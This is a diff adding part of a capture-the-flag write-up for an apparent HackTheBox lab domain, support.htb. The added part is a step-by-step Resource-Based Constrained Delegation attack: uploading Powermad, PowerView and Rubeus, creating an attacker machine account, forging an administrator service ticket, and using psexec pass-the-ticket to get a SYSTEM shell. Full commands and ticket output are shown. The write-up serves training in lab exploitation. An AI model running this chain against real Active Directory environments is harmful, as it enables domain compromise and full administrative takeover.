@@ -354,6 +354,144 @@ DC
 
 The value is empty, which means we are ready to perform the RBCD attack. Upload the PowerMad and Rubeus tool for this attack:
 
-```
+```sh
 $ curl -s -O https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1
+$ sudo apt install rubeus
+# At the winrm session
+*Evil-WinRM* PS C:\Users\support\Documents> upload tools/PowerView.ps1
+                                        
+Info: Uploading /home/kali/tools/PowerView.ps1 to C:\Users\support\Documents\PowerView.ps1
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> upload tools/Powermad.ps1
+                                        
+Info: Uploading /home/kali/tools/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\support\Documents> upload ../../usr/share/windows-resources/rubeus/Rubeus.exe
+                                        
+Info: Uploading /home/kali/../../usr/share/windows-resources/rubeus/Rubeus.exe to C:\Users\support\Documents\Rubeus.exe
+                                        
+Info: Upload successful!
+```
+
+Now follow the instruction on a **Resource-Based Constrained Delegation attack** on Bloodhound:
+
+Abusing this primitive is possible through the Rubeus project.
+
+First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:
+
+```pwsh
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+```
+
+PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+
+```pwsh
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+```
+
+We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:
+
+```pwsh
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+```
+
+Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:
+
+```
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+```
+./Rubeus.exe hash /password:Summer2018!
+```
+
+And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+
+```
+./Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
+
+<SNIP>
+[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+      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
+[+] Ticket successfully imported!
+```
+
+Copy the ticket to `ticket.kirbi.b64`. Then b64 decode it to `ticket.kirbi` and use impacket's `ticketConverter.py` to convert it to a ccache format:
+
+```
+$ base64 -d ticket.kirbi.b64 > ticket.kirbi
+$ ticketConverter.py ticket.kirbi ticket.ccache
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] converting kirbi to ccache...
+[+] done
+```
+
+> Following the steps for the Computer Takeover attack, eventually I get a ticket for the administrator, which Rubeus says should give administrator access in that session, but it doesn't work. What is the name of the script from Impacket that can convert that ticket to ccache format? → ticketConverter.py
+
+Use psexec with the obtained Kerberos ticket to perform a Pass-the-Ticket attack and gain a shell on the target DC as Administrator:
+
+```sh
+$ KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file FwFkRrBB.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service vmeB on dc.support.htb.....
+[*] Starting service vmeB.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+> What is the name of the environment variable on our local system that we'll set to that ccache file to allow use of files like psexec.py with the -k and -no-pass options? → KRB5CCNAME
+
+Read the flag:
+
+```pwsh
+C:\Users\Administrator\Desktop> more root.txt
+7e45daaad2e8cd8f7a077197b5030fc8
 ```
